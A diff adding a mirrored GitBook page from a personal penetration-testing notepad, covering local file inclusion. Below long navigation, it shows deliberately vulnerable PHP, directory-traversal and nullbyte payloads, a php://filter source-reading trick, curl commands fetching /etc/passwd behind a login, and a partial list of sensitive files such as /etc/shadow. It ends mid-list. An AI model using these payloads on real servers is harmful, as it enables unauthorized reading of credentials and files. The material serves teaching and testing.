@@ -1,0 +1,1994 @@
+
+<!DOCTYPE HTML>
+<html lang="en" >
+    
+<!-- Mirrored from xapax.gitbooks.io/security/local_file_inclusion.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 26 Sep 2018 18:11:05 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>Local File Inclusion · Security - My notepad</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        <meta name="author" content="Philip Linghammar">
+        
+        
+    
+    <link rel="stylesheet" href="gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-comment/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+        <link rel="stylesheet" href="styles/website.css">
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="remote_file_inclusion.html" />
+    
+    
+    <link rel="prev" href="lead_to_compromise.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+    
+        
+        <li>
+            <a href="https://legacy.gitbook.com/book/xapax/security" target="_blank" class="custom-link">Security - My notepad</a>
+        </li>
+    
+    
+
+    
+    <li class="divider"></li>
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="./">
+            
+                <a href="index.html">
+            
+                    
+                    Introduction
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="the_basics.html">
+            
+                <a href="the_basics.html">
+            
+                    
+                    The Basics
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" data-path="linux.html">
+            
+                <a href="linux.html">
+            
+                    
+                    Linux
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1.1" data-path="basics_of_linux.html">
+            
+                <a href="basics_of_linux.html">
+            
+                    
+                    Basics of Linux
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.2" data-path="bash-scripting.html">
+            
+                <a href="bash-scripting.html">
+            
+                    
+                    Bash-scripting
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.3" data-path="vim.html">
+            
+                <a href="vim.html">
+            
+                    
+                    Vim
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2" data-path="windows.html">
+            
+                <a href="windows.html">
+            
+                    
+                    Windows
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.1" data-path="basics_of_windows.html">
+            
+                <a href="basics_of_windows.html">
+            
+                    
+                    Basics of Windows
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.2" data-path="powershell.html">
+            
+                <a href="powershell.html">
+            
+                    
+                    PowerShell
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.3" data-path="powershell_scripting2.html">
+            
+                <a href="powershell_scripting2.html">
+            
+                    
+                    PowerShell Scripting
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.4" data-path="cmd.html">
+            
+                <a href="cmd.html">
+            
+                    
+                    CMD
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3" data-path="scripting_with_python.html">
+            
+                <a href="scripting_with_python.html">
+            
+                    
+                    Scripting With Python
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.3.1" data-path="python_fundamentals.html">
+            
+                <a href="python_fundamentals.html">
+            
+                    
+                    Python Fundamentals
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3.2" data-path="connections.html">
+            
+                <a href="connections.html">
+            
+                    
+                    Useful Scripts
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4" data-path="transfering_files2.html">
+            
+                <a href="transfering_files2.html">
+            
+                    
+                    Transferring Files
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.4.1" data-path="transfering_files.html">
+            
+                <a href="transfering_files.html">
+            
+                    
+                    Transfering Files on Linux
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.2" data-path="transfering_files_to_windows.html">
+            
+                <a href="transfering_files_to_windows.html">
+            
+                    
+                    Transfering files on Windows
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5" data-path="firewalls.html">
+            
+                <a href="firewalls.html">
+            
+                    
+                    Firewalls
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6" data-path="general_tips.html">
+            
+                <a href="general_tips.html">
+            
+                    
+                    General tips and tricks
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.7" >
+            
+                <span>
+            
+                    
+                    Cryptography
+            
+                </span>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="scanning.html">
+            
+                <a href="scanning.html">
+            
+                    
+                    Recon and Information Gathering Phase
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" data-path="passive_information_gatherig.html">
+            
+                <a href="passive_information_gatherig.html">
+            
+                    
+                    Passive Information Gatherig
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1.1" >
+            
+                <span>
+            
+                    
+                    Identify IP-addresses and Subdomains
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1.1.1" >
+            
+                <span>
+            
+                    
+                    Identify IP-addresses
+            
+                </span>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.1.2" data-path="find_subdomains.html">
+            
+                <a href="find_subdomains.html">
+            
+                    
+                    Find Subdomains
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1.1.2.1" data-path="dns_basics.html">
+            
+                <a href="dns_basics.html">
+            
+                    
+                    DNS Basics
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.1.2.2" data-path="finding_subdomains.html">
+            
+                <a href="finding_subdomains.html">
+            
+                    
+                    Finding subdomains
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.1.2.3" data-path="dns_zone_transfer_attack.html">
+            
+                <a href="dns_zone_transfer_attack.html">
+            
+                    
+                    DNS Zone Transfer Attack
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.2" data-path="email_harvesting.html">
+            
+                <a href="email_harvesting.html">
+            
+                    
+                    Identifying People
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.3" data-path="google_hacking.html">
+            
+                <a href="google_hacking.html">
+            
+                    
+                    Search Engine Discovery
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.4" data-path="identifying-technology-stack.html">
+            
+                <a href="identifying-technology-stack.html">
+            
+                    
+                    Identifying Technology Stack
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2" data-path="active_information_gathering.html">
+            
+                <a href="active_information_gathering.html">
+            
+                    
+                    Active Information Gathering
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.2.1" data-path="port_scanning.html">
+            
+                <a href="port_scanning.html">
+            
+                    
+                    Port Scanning
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" data-path="vulnerability_analysi1s.html">
+            
+                <a href="vulnerability_analysi1s.html">
+            
+                    
+                    Vulnerability analysis
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1" data-path="server-side-vulnerabilities.html">
+            
+                <a href="server-side-vulnerabilities.html">
+            
+                    
+                    Non-HTTP Vulnerabilities
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1.1" data-path="list_of_common_ports.html">
+            
+                <a href="list_of_common_ports.html">
+            
+                    
+                    Common ports\/services and how to use them
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.1.2" data-path="port_knocking.html">
+            
+                <a href="port_knocking.html">
+            
+                    
+                    Port Knocking
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2" data-path="web-services.html">
+            
+                <a href="web-services.html">
+            
+                    
+                    HTTP - Web Vulnerabilities
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.2.1" data-path="common_web-services.html">
+            
+                <a href="common_web-services.html">
+            
+                    
+                    Common Web-services
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.2" >
+            
+                <span>
+            
+                    
+                    Authentication
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.2.2.1" >
+            
+                <span>
+            
+                    
+                    OAuth
+            
+                </span>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.3" data-path="session-management.html">
+            
+                <a href="session-management.html">
+            
+                    
+                    Session Management
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.2.3.1" >
+            
+                <span>
+            
+                    
+                    Ses
+            
+                </span>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.4" data-path="broken_authentication_or_session_management.html">
+            
+                <a href="broken_authentication_or_session_management.html">
+            
+                    
+                    Broken Authentication or Session Management
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.5" data-path="session-fixation.html">
+            
+                <a href="session-fixation.html">
+            
+                    
+                    Session Fixation
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.6" data-path="waf_-_web_application_firewall.html">
+            
+                <a href="waf_-_web_application_firewall.html">
+            
+                    
+                    WAF - Web Application Firewall
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.7" data-path="lead_to_compromise.html">
+            
+                <a href="lead_to_compromise.html">
+            
+                    
+                    Attacking the System
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter active" data-level="1.4.2.7.1" data-path="local_file_inclusion.html">
+            
+                <a href="local_file_inclusion.html">
+            
+                    
+                    Local File Inclusion
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.7.2" data-path="remote_file_inclusion.html">
+            
+                <a href="remote_file_inclusion.html">
+            
+                    
+                    Remote File Inclusion
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.7.3" data-path="directory-traversal-attack.html">
+            
+                <a href="directory-traversal-attack.html">
+            
+                    
+                    Directory Traversal Attack
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.7.4" data-path="web-scanning.html">
+            
+                <a href="web-scanning.html">
+            
+                    
+                    Hidden Files and Directories
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.7.5" data-path="sql-injections.html">
+            
+                <a href="sql-injections.html">
+            
+                    
+                    SQL-Injections
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.7.6" data-path="nosql-injections.html">
+            
+                <a href="nosql-injections.html">
+            
+                    
+                    Nosql-Injections
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.7.7" data-path="xml_external_entity_attack.html">
+            
+                <a href="xml_external_entity_attack.html">
+            
+                    
+                    XML External Entity Attack
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.7.8" data-path="bypass_image_upload.html">
+            
+                <a href="bypass_image_upload.html">
+            
+                    
+                    Bypass File Upload Filtering
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.7.9" data-path="exposed_version_control.html">
+            
+                <a href="exposed_version_control.html">
+            
+                    
+                    Exposed Version Control
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.7.10" >
+            
+                <span>
+            
+                    
+                    Directory Traversal Attack
+            
+                </span>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.7.11" data-path="host-header-attack.html">
+            
+                <a href="host-header-attack.html">
+            
+                    
+                    Host Header Attack
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.7.12" data-path="deserialization-attacks.html">
+            
+                <a href="deserialization-attacks.html">
+            
+                    
+                    Deserialization attacks
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3" data-path="attacking_the_user.html">
+            
+                <a href="attacking_the_user.html">
+            
+                    
+                    Attacking the User
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.3.1" data-path="clickjacking.html">
+            
+                <a href="clickjacking.html">
+            
+                    
+                    Clickjacking
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3.2" data-path="text-injection.html">
+            
+                <a href="text-injection.html">
+            
+                    
+                    Text/content-injection
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3.3" data-path="html-injection.html">
+            
+                <a href="html-injection.html">
+            
+                    
+                    HTML-Injection
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3.4" data-path="insecure-direct-object-reference-idor.html">
+            
+                <a href="insecure-direct-object-reference-idor.html">
+            
+                    
+                    Insecure Direct Object Reference (IDOR)
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3.5" data-path="subdomain_takeover.html">
+            
+                <a href="subdomain_takeover.html">
+            
+                    
+                    Subdomain Takeover
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3.6" data-path="cross_site_request_forgery.html">
+            
+                <a href="cross_site_request_forgery.html">
+            
+                    
+                    Cross Site Request Forgery
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3.7" data-path="cross-site-scripting.html">
+            
+                <a href="cross-site-scripting.html">
+            
+                    
+                    Cross-Site Scripting
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.3.7.1" data-path="examplesXSS.html">
+            
+                <a href="examplesXSS.html">
+            
+                    
+                    Examples
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3.7.2" data-path="dom-based-xss.html">
+            
+                <a href="dom-based-xss.html">
+            
+                    
+                    DOM-based XSS
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3.8" data-path="browser_vulnerabilities.html">
+            
+                <a href="browser_vulnerabilities.html">
+            
+                    
+                    Browser Vulnerabilities
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3.9" >
+            
+                <span>
+            
+                    
+                    HTML-Injection
+            
+                </span>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.4" data-path="automated_vulnerability_scanners.html">
+            
+                <a href="automated_vulnerability_scanners.html">
+            
+                    
+                    Automated Vulnerability Scanners
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" data-path="exploiting.html">
+            
+                <a href="exploiting.html">
+            
+                    
+                    Exploiting
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.5.1" data-path="social_engineering_-_phishing.html">
+            
+                <a href="social_engineering_-_phishing.html">
+            
+                    
+                    Social Engineering - Phishing
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.2" data-path="default_layout_apache_on_different_versiont.html">
+            
+                <a href="default_layout_apache_on_different_versiont.html">
+            
+                    
+                    Default Layout of Apache on Different Versions
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.3" data-path="reverse-shell.html">
+            
+                <a href="reverse-shell.html">
+            
+                    
+                    Shells
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.4" data-path="webshell.html">
+            
+                <a href="webshell.html">
+            
+                    
+                    Webshell
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.5" data-path="create_shellcode.html">
+            
+                <a href="create_shellcode.html">
+            
+                    
+                    Generate Shellcode
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.6" data-path="editing-exploits.html">
+            
+                <a href="editing-exploits.html">
+            
+                    
+                    Editing Exploits
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.7" data-path="compiling-windows-exploits.html">
+            
+                <a href="compiling-windows-exploits.html">
+            
+                    
+                    Compiling windows exploits
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6" data-path="post_exploitation.html">
+            
+                <a href="post_exploitation.html">
+            
+                    
+                    Post Exploitation
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.6.1" data-path="spawning_shells.html">
+            
+                <a href="spawning_shells.html">
+            
+                    
+                    Spawning Shells
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.2" data-path="getting_meterpreter_shell.html">
+            
+                <a href="getting_meterpreter_shell.html">
+            
+                    
+                    Meterpreter for Post-Exploitation
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.3" data-path="privilege_escalation_-_linux.html">
+            
+                <a href="privilege_escalation_-_linux.html">
+            
+                    
+                    Privilege Escalation - Linux
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.4" data-path="privilege_escalation_windows.html">
+            
+                <a href="privilege_escalation_windows.html">
+            
+                    
+                    Privilege Escalation - Windows
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.5" data-path="privilege-escalation-powershell.html">
+            
+                <a href="privilege-escalation-powershell.html">
+            
+                    
+                    Privilege Escalation - Powershell
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.6" data-path="escaping_restricted_shell.html">
+            
+                <a href="escaping_restricted_shell.html">
+            
+                    
+                    Escaping Restricted Shell
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.7" data-path="bypassing_antivirus.html">
+            
+                <a href="bypassing_antivirus.html">
+            
+                    
+                    Bypassing antivirus
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.8" data-path="loot.html">
+            
+                <a href="loot.html">
+            
+                    
+                    Loot and Enumerate
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.6.8.1" data-path="loot_windows_-_for_credentials_and_other_stuff.html">
+            
+                <a href="loot_windows_-_for_credentials_and_other_stuff.html">
+            
+                    
+                    Loot Windows
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.8.2" data-path="tcp-dumps_on_pwnd_machines.html">
+            
+                <a href="tcp-dumps_on_pwnd_machines.html">
+            
+                    
+                    Loot Linux
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.9" data-path="persistence.html">
+            
+                <a href="persistence.html">
+            
+                    
+                    Persistence
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.10" data-path="clean_up.html">
+            
+                <a href="clean_up.html">
+            
+                    
+                    Cover your tracks
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7" data-path="password-cracking.html">
+            
+                <a href="password-cracking.html">
+            
+                    
+                    Password Cracking
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.7.1" data-path="generate_custom_wordlist.html">
+            
+                <a href="generate_custom_wordlist.html">
+            
+                    
+                    Generate Custom Wordlist
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.2" data-path="identify_hash_and_crack_it.html">
+            
+                <a href="identify_hash_and_crack_it.html">
+            
+                    
+                    Offline Password Cracking
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.3" data-path="online_password_cracking.html">
+            
+                <a href="online_password_cracking.html">
+            
+                    
+                    Online Password Cracking
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.4" data-path="pass_the_hash_-_reusing_hashes.html">
+            
+                <a href="pass_the_hash_-_reusing_hashes.html">
+            
+                    
+                    Pass the Hash - Reusing Hashes
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8" data-path="port_forwarding_and_tunneling.html">
+            
+                <a href="port_forwarding_and_tunneling.html">
+            
+                    
+                    Pivoting - Port forwarding - Tunneling
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9" data-path="network_traffic.html">
+            
+                <a href="network_traffic.html">
+            
+                    
+                    Network traffic analysis
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.9.1" data-path="arp-spoofing.html">
+            
+                <a href="arp-spoofing.html">
+            
+                    
+                    Arp-spoofing
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.9.1.1" data-path="ssl-strip.html">
+            
+                <a href="ssl-strip.html">
+            
+                    
+                    SSL-strip
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9.2" data-path="dns-spoofing.html">
+            
+                <a href="dns-spoofing.html">
+            
+                    
+                    DNS-spoofing
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9.3" data-path="wireshark.html">
+            
+                <a href="wireshark.html">
+            
+                    
+                    Wireshark
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.10" data-path="wifi.html">
+            
+                <a href="wifi.html">
+            
+                    
+                    Wifi
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.10.1" data-path="wep.html">
+            
+                <a href="wep.html">
+            
+                    
+                    WEP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.10.2" data-path="wps.html">
+            
+                <a href="wps.html">
+            
+                    
+                    WPS
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.11" data-path="physical_access_to_machine.html">
+            
+                <a href="physical_access_to_machine.html">
+            
+                    
+                    Physical access to machine
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.12" data-path="littearature.html">
+            
+                <a href="littearature.html">
+            
+                    
+                    Literature
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com/" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="index.html" >Local File Inclusion</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="local-file-inclusion-lfi">Local File Inclusion (LFI)</h1>
+<p>Local file inclusion means unauthorized access to files on the system. This vulnerability lets the attacker gain access to sensitive files on the server, and it might also lead to gaining a shell.</p>
+<h2 id="how-does-it-work">How does it work?</h2>
+<p>The vulnerability stems from unsanitized user-input. LFI is particularly common in php-sites. </p>
+<p>Here is an example of php-code vulnerable to LFI. As you can see we just pass in the url-parameter into the require-function without any sanitization. So the user can just add the path to any file.</p>
+<pre><code class="lang-php">$file = $_GET[<span class="hljs-string">&apos;page&apos;</span>];
+<span class="hljs-keyword">require</span>($file);
+</code></pre>
+<p>In this example the user could just enter this string and retrieve the <code>/etc/passwd</code> file.</p>
+<pre><code>http://example.com/page=../../../../../../etc/passwd
+</code></pre><h3 id="bypassing-the-added-php-and-other-extra-file-endings">Bypassing the added .php and other extra file-endings</h3>
+<p>It is common to add the file-extension through the php-code. Here is how this would look like:</p>
+<pre><code class="lang-php">$file = $_GET[<span class="hljs-string">&apos;page&apos;</span>];
+<span class="hljs-keyword">require</span>($file . <span class="hljs-string">&quot;.php&quot;</span>);
+</code></pre>
+<p>The php is added to the filename, this will mean that we will not be able to find the files we are looking for. Since the file <code>/etc/passwd.php</code> does not exist. However, if we add the nullbyte to the end of our attack-string the <code>.php</code> will not be taken into account. So we add <code>%00</code> to the end of our attack-string.</p>
+<pre><code>http://example.com/page=../../../../../../etc/passwd%00
+</code></pre><p>This technique is usually called the nullbyte technique since <code>%00</code> is the nullbyte. The technique only works in versions below php 5.3. So look out for that.</p>
+<p>Another way to deal with this problem is just to add a question mark to your attack-string. This way the stuff after gets interpreted as a parameter and therefore excluded. Here is an example:</p>
+<pre><code>http://example.com/page=../../../../../../etc/passwd?
+</code></pre><h2 id="bypassing-php-execution">Bypassing php-execution</h2>
+<p>So if you have an LFI you can easily read <code>.txt</code>-files but not <code>.php</code> files. That is because they get executed by the webserver, since their file-ending says that it contains code. This can be bypassed by using a build-in php-filter.</p>
+<pre><code>http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index
+</code></pre><p>Here you use a php-filter to convert it all into base64. So in return you get the whole page base64 encoded. Now you only need to decode it. Save the base64-text into a file and then run:</p>
+<pre><code>base64 -d savefile.php
+</code></pre><h2 id="linux">Linux</h2>
+<h3 id="tricks">Tricks</h3>
+<p><strong>Download config-files in a nice style-format</strong>  </p>
+<p>If you read files straight in the browser the styling can becomes unbearable. Really difficult to read. A way around it is to download the files from the terminal. But that won&apos;t work if there is a login that is blocking it. So this is a great workaround:</p>
+<pre><code># First we save the cookie
+curl -s http://example.com/login.php -c cookiefile -d &quot;user=admin&amp;pass=admin&quot;
+curl -s http://example.com/gallery.php?page=/etc/passwd -b cookiefile
+</code></pre><h3 id="sensitive-file">Sensitive file</h3>
+<p>This is the default layout of important apache files.<br><a href="https://wiki.apache.org/httpd/DistrosDefaultLayout" target="_blank">https://wiki.apache.org/httpd/DistrosDefaultLayout</a></p>
+<pre><code>/etc/issue (A message or system identification to be printed before the login prompt.)
+/etc/motd (Message of the day banner content. Can contain information about the system owners or use of the system.)
+/etc/passwd 
+/etc/group 
+/etc/resolv.conf (might be better than /etc/passwd for triggering IDS sigs)
+/etc/shadow
+/home/[USERNAME]/.bash_history or .profile
+~/.bash_history or .profile
+$USER/.bash_history or .profile
+/root/.bash_history or .profile
+</code></pre><p>Comes from here: <a href="https://gist.github.com/sckalath/a8fd4e754a72015aa0b8" target="_blank">https://gist.github.com/sckalath/a8fd4e754a72015aa0b8</a></p>
+<pre><code>/etc/mtab  
+/etc/inetd.conf  
+/var/log/dmessage
+</code></pre><p><strong>Web server files</strong></p>
+<pre><code># Usually found in the root of the website
+.htaccess
